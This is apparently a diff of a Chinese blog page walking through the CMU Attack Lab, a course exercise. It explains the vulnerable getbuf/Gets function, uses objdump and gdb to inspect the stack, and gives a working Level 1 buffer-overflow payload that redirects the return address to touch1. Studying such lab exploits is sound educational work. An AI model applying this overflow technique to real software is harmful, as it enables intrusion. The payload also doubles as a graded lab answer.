@@ -94,7 +94,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      1 min read
+      3 min read
     
 </span></p>
 
@@ -129,6 +129,7 @@ window.onload = wrap_img;
 <li class="toc-entry toc-h3"><a href="#0x0-introduction">0x0 Introduction</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#0x01-preparation">0x0.1 Preparation</a></li>
+<li class="toc-entry toc-h4"><a href="#0x02-target-programs">0x0.2 Target Programs</a></li>
 </ul>
 </li>
 <li class="toc-entry toc-h3"><a href="#0x1-code-injection-attacks">0x1 Code Injection Attacks</a>
@@ -177,7 +178,7 @@ window.onload = wrap_img;
 </code></pre></div>    </div>
   </li>
   <li>
-    <p>最后需要使用的是 lab 中提供的工具 <code class="language-plaintext highlighter-rouge">hex2raw</code>，这个工具可以将我们在前两个步骤中获得的机器码转换成2进制的字节码，这正是计算机真正执行的代码；</p>
+    <p>最后需要使用的是 lab 中提供的工具 <code class="language-plaintext highlighter-rouge">hex2raw</code>，因为程序需要的输入是字符串，但是我们工具的时候希望传入字节码，这个工具可以将我们期望传入程序的字节码转换成字符串；</p>
 
     <div class="language-shell highlighter-rouge">
 <div class="highlight"><pre class="highlight"><code> ./hex2raw &lt; exploit.txt <span class="o">&gt;</span> exploit.bin
@@ -187,11 +188,143 @@ window.onload = wrap_img;
 
 <p>通过这三个工具我们就可以将需要执行的汇编代码转换成字节码，最终送到计算机中进行执行，这三个工具也给了我们做 code-injection 攻击的基础。</p>
 
+<h4 id="0x02-target-programs">
+<a class="anchor" href="#0x02-target-programs" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x0.2 Target Programs</h4>
+
+<p>这个 lab 中一共有两个 program 需要进行攻击，分别是 <code class="language-plaintext highlighter-rouge">CTARGET</code> 和 <code class="language-plaintext highlighter-rouge">RTARGET</code>，它们都是从 standard input 中读入 strings，主要是利用了下面 <code class="language-plaintext highlighter-rouge">getbuf</code> 这个函数</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
+    <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>函数 <code class="language-plaintext highlighter-rouge">Gets</code> 和 <code class="language-plaintext highlighter-rouge">gets</code> 当 <code class="language-plaintext highlighter-rouge">BUFFER_SIZE</code> 足够大或者是 string 很小的时候是没有区别的，他们的行为就是将输入的 string 复制到目标位置，比如下面的例子</p>
+
+<p>当输入比较短的字符串序列时，可以获得正常的结果。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix&gt; ./ctarget <span class="nt">-q</span>
+Cookie: 0x59b997fa
+Type string:Keep it short!
+No exploit.  Getbuf returned 0x1
+Normal <span class="k">return</span>
+</code></pre></div></div>
+
+<p>当输入比较长的字符串序列时，会触发 segmentation fault。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix&gt; ./ctarget <span class="nt">-q</span>
+Cookie: 0x59b997fa
+Type string:This is not a very interesting string, but it has the property that
+Ouch!: You caused a segmentation fault!
+Better luck next <span class="nb">time
+</span>FAIL: Would have posted the following:
+        user <span class="nb">id </span>bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:FAIL:0xffffffff:ctarget:0:54 68 69 73 20 69 73 20 6E 6F 74 20 61 20 76 65 72 79 20 69 6E 74 65 72 65 73 74 69 6E 67 20 73 74 72 69 6E 67 2C 20 62 75 74 20 69 74 20 68 61 73 20 74 68 65 20 70 72 6F 70 65 72 74 79 20 74 68 61 74
+</code></pre></div></div>
+
+<p>我们的任务就是通过 <code class="language-plaintext highlighter-rouge">ctarget</code> 输入一个字符串来实现对这个程序的攻击，下面我们来具体针对每个 case 进行讲解。</p>
+
 <h3 id="0x1-code-injection-attacks">
 <a class="anchor" href="#0x1-code-injection-attacks" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1 Code Injection Attacks</h3>
 
+<p>对于前三个阶段，你需要把输入 string 存在 stack 中，如果 string 这包含一段可执行文件的字节编码，那么程序会将这个字符串看做可执行的代码，这样就实现了对代码的攻击。</p>
+
 <h4 id="0x11-level-1">
 <a class="anchor" href="#0x11-level-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.1 Level 1</h4>
+
+<p>这个阶段是一个热身环节，不需要插入可执行的代码，只需要在程序返回的时候，重定向到另外一个存在的 procedure 中就可以了。</p>
+
+<p>首先通过 <code class="language-plaintext highlighter-rouge">objdump -d ctarget &gt; ctarget.s</code> 可以将可执行程序反编译成汇编代码，而 <code class="language-plaintext highlighter-rouge">getbuf</code> 主要在下面的 <code class="language-plaintext highlighter-rouge">test</code> 函数中进行调用</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>当 <code class="language-plaintext highlighter-rouge">getbuf</code> 执行结束之后，函数会返回到 <code class="language-plaintext highlighter-rouge">test</code> 中继续执行后面的语句，在这次攻击中，我们希望程序在执行完 <code class="language-plaintext highlighter-rouge">getbuf</code> 之后可以跳到 <code class="language-plaintext highlighter-rouge">touch1</code> 这种函数中，而不要继续在 <code class="language-plaintext highlighter-rouge">test</code> 中执行。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>         <span class="o">/</span> <span class="o">*</span> <span class="n">Part</span> <span class="n">of</span> <span class="n">validation</span> <span class="n">protocol</span> <span class="o">*</span> <span class="o">/</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>首先可以在汇编中找到 <code class="language-plaintext highlighter-rouge">test</code> 和 <code class="language-plaintext highlighter-rouge">getbuf</code> 对应的位置代码如下</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0000000000401968</span> <span class="o">&lt;</span><span class="nx">test</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">401968</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="nx">ec</span> <span class="mi">08</span>          	<span class="nx">sub</span>    <span class="nx">$0x8</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+  <span class="mi">40196</span><span class="nx">c</span><span class="p">:</span>	<span class="nx">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nx">mov</span>    <span class="nx">$0x0</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+  <span class="mi">401971</span><span class="p">:</span>	<span class="nx">e8</span> <span class="mi">32</span> <span class="nx">fe</span> <span class="nx">ff</span> <span class="nx">ff</span>       	<span class="nx">callq</span>  <span class="mi">4017</span><span class="nx">a8</span> <span class="o">&lt;</span><span class="nx">getbuf</span><span class="o">&gt;</span>
+  <span class="mi">401976</span><span class="p">:</span>	<span class="mi">89</span> <span class="nx">c2</span>                	<span class="nx">mov</span>    <span class="o">%</span><span class="nx">eax</span><span class="p">,</span><span class="o">%</span><span class="nx">edx</span>
+  <span class="mi">401978</span><span class="p">:</span>	<span class="nx">be</span> <span class="mi">88</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nx">mov</span>    <span class="nx">$0x403188</span><span class="p">,</span><span class="o">%</span><span class="nx">esi</span>
+  <span class="mi">40197</span><span class="nx">d</span><span class="p">:</span>	<span class="nx">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nx">mov</span>    <span class="nx">$0x1</span><span class="p">,</span><span class="o">%</span><span class="nx">edi</span>
+  <span class="mi">401982</span><span class="p">:</span>	<span class="nx">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nx">mov</span>    <span class="nx">$0x0</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+  <span class="mi">401987</span><span class="p">:</span>	<span class="nx">e8</span> <span class="mi">64</span> <span class="nx">f4</span> <span class="nx">ff</span> <span class="nx">ff</span>       	<span class="nx">callq</span>  <span class="mi">400</span><span class="nx">df0</span> <span class="o">&lt;</span><span class="nx">__printf_chk</span><span class="p">@</span><span class="nd">plt</span><span class="o">&gt;</span>
+  <span class="mi">40198</span><span class="nx">c</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="nx">c4</span> <span class="mi">08</span>          	<span class="nx">add</span>    <span class="nx">$0x8</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+  <span class="p">...</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00000000004017</span><span class="nx">a8</span> <span class="o">&lt;</span><span class="nx">getbuf</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">4017</span><span class="nx">a8</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="nx">ec</span> <span class="mi">28</span>          	<span class="nx">sub</span>    <span class="nx">$0x28</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+  <span class="mi">4017</span><span class="nx">ac</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="nx">e7</span>             	<span class="nx">mov</span>    <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+  <span class="mi">4017</span><span class="nx">af</span><span class="p">:</span>	<span class="nx">e8</span> <span class="mi">8</span><span class="nx">c</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nx">callq</span>  <span class="mi">401</span><span class="nx">a40</span> <span class="o">&lt;</span><span class="nx">Gets</span><span class="o">&gt;</span>
+  <span class="mi">4017</span><span class="nx">b4</span><span class="p">:</span>	<span class="nx">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nx">mov</span>    <span class="nx">$0x1</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+  <span class="mi">4017</span><span class="nx">b9</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="nx">c4</span> <span class="mi">28</span>          	<span class="nx">add</span>    <span class="nx">$0x28</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+  <span class="mi">4017</span><span class="nx">bd</span><span class="p">:</span>	<span class="nx">c3</span>                   	<span class="nx">retq</span>   
+  <span class="mi">4017</span><span class="nx">be</span><span class="p">:</span>	<span class="mi">90</span>                   	<span class="nx">nop</span>
+  <span class="mi">4017</span><span class="nx">bf</span><span class="p">:</span>	<span class="mi">90</span>                   	<span class="nx">nop</span>
+</code></pre></div></div>
+
+<p>在 <code class="language-plaintext highlighter-rouge">getbuf</code> 中，程序首先将栈顶 <code class="language-plaintext highlighter-rouge">%rsp</code> 减小 0x28=40 个字节，接着通过调用 <code class="language-plaintext highlighter-rouge">Gets</code> 获得用户输入的字符串，然后再将栈顶增加 40 个字节，最后通过 <code class="language-plaintext highlighter-rouge">retq</code> 退出这个函数的执行。</p>
+
+<p>通过 <code class="language-plaintext highlighter-rouge">gdb</code> 进行执行，在 <code class="language-plaintext highlighter-rouge">getbuf</code> 这个函数开始时打上断点，然后进行运行，接着通过下面的命令查看分配的 buffer 大小</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">6</span><span class="nx">gx</span> <span class="nx">$rsp</span>
+<span class="mh">0x5561dc78</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc88</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc98</span><span class="p">:</span>     <span class="mh">0x0000000055586000</span>      <span class="mh">0x0000000000401976</span>
+</code></pre></div></div>
+
+<p>可以发现当程序执行完毕之后，增加栈顶，最终返回的地址是 <code class="language-plaintext highlighter-rouge">0x401976</code>，这正是 <code class="language-plaintext highlighter-rouge">test</code> 函数中调用 <code class="language-plaintext highlighter-rouge">getbuf</code> 之后一行的执行地址，所以我们只需要写入字符串，让字符串 overflow，将这个返回的地址变成我们希望他执行的函数 <code class="language-plaintext highlighter-rouge">touch1</code> 的地址 <code class="language-plaintext highlighter-rouge">0x4017c0</code> 即可。</p>
+
+<p>所以输入的字符串如下</p>
+
+<pre><code class="language-txt">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 
+</code></pre>
+
+<p>其中前面 5 行，每行 8 个字节，一共 40 个字节填充了栈中的 buffer，接着填入 <code class="language-plaintext highlighter-rouge">c0 17 40</code> 替换之前的返回地址，这里要注意填入的顺序，返回地址是 <code class="language-plaintext highlighter-rouge">0x4017c0</code>，在填入 buffer 的时候，顺序是按地址从小到大依次填入每个字符，所以应该填入 <code class="language-plaintext highlighter-rouge">c0 17 40</code>，这样从地址中拿到的数据才是 <code class="language-plaintext highlighter-rouge">0x4017c0</code>。</p>
+
+<p>接着可以通过 <code class="language-plaintext highlighter-rouge">gdb</code> 验证一下输入这样的 string 后 stack 中的内存变化</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">6</span><span class="nx">gx</span> <span class="nx">$rsp</span>
+<span class="mh">0x5561dc78</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc88</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc98</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000004017c0</span>
+</code></pre></div></div>
+
+<p>发现确实已经生效了，最后通过下面的方式验证 level1 攻击已经成功。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hex2raw <span class="nt">-i</span> ctarget.1.txt| ./ctarget <span class="nt">-q</span>
+
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1<span class="o">()</span>
+Valid solution <span class="k">for </span>level 1 with target ctarget
+PASS: Would have posted the following:
+</code></pre></div></div>
+
+<p>通过上面的信息提示可以看到，我们已经成功的调用了 <code class="language-plaintext highlighter-rouge">touch1</code>。</p>
 
 <h4 id="0x12-level-2">
 <a class="anchor" href="#0x12-level-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.2 Level 2</h4>
